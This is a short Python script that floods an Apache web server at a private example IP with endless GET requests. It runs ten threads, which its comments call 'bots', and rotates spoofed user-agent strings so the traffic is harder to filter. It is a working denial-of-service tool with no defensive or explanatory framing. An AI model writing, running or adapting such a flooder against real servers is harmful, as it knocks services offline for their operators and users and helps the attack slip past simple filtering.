import threading
import requests
import random

# Target Apache server (just an example IP, not real)
target_url = "http://192.168.1.100"

# Fake user agents to mimic different clients
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Linux; Android 10)"
]

def flood_request():
    while True:
        try:
            # Randomize headers to look like different users
            headers = {"User-Agent": random.choice(user_agents)}
            # Send a GET request to the server
            response = requests.get(target_url, headers=headers)
            print(f"Sent request: {response.status_code}")
        except:
            print("Request failed—server might be struggling!")

# Launch multiple "attack" threads
for _ in range(10):  # Simulate 10 "bots"
    thread = threading.Thread(target=flood_request)
    thread.start()

print("Flooding the Apache server...")
